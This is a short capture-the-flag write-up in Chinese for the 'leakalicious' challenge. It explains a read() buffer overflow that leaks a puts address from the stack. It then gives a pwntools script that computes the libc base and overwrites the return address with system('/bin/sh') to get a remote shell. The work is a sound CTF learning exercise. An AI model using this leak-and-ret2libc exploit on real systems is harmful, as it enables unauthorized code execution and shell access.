### leakalicious

> [附件](./leakalicious)

read函数存在溢出，puts函数在栈中的数据刚好在buf的下方，只要填充满32个byte输出的时候就能leak出puts的地址，计算偏移后覆盖返回地址拿到shell

```
-00000028
-00000028 buf             db 32 dup(?)
-00000008 puts_addr       dd ?
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 argc            dd ?
+0000000C argv            dd ?                    ; offset
+00000010 envp            dd ?                    ; offset
+00000014
+00000014 ; end of stack variables
```

[Exploit script:](./leak.py)

```python
from pwn import *
context.log_level='debug'
p = remote('chal.tuctf.com',30505)
# p = process('leakalicious')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p.recvuntil('> ')
# gdb.attach(p)
p.send('A'*32)
p.recvuntil('A'*32)
base=u32(p.recv(4))-libc.symbols['puts']
print hex(base)
sys = base + libc.symbols['system']
sh = base+libc.search('/bin/sh').next()
p.recvuntil('> ')
p.sendline('A'*44+p32(sys)+p32(0)+p32(sh))

# gdb.attach(p)
p.recvuntil('> ')
p.sendline('A'*44+p32(sys)+p32(0)+p32(sh))

p.interactive()
```

